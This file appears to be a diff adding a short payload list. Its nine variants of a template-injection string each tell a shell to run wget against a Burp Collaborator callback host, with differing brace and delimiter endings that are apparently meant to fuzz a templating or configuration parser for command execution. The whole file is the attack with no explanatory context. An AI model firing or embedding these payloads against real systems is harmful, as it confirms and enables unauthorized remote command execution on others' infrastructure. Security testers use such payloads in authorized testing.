@@ -1,0 +1,9 @@
+\{\{{{command: [sh, -c]       args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]##
+{{command: [sh, -c]       args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]##`}}
+{{command: [sh, -c]       args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]}}
+{{command: [sh, -c] args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]}}
+{{command: [sh, -c] args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]
+{{command: [sh, -c] args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]}
+{{command: [sh, -c] args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]}#
+{{command: [sh, -c] args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]}}{
+{{command: [sh, -c] args: ["wget http://0pqa0ypbkwvwvtoxx3nq8dmjva19py.burpcollaborator.net"]{
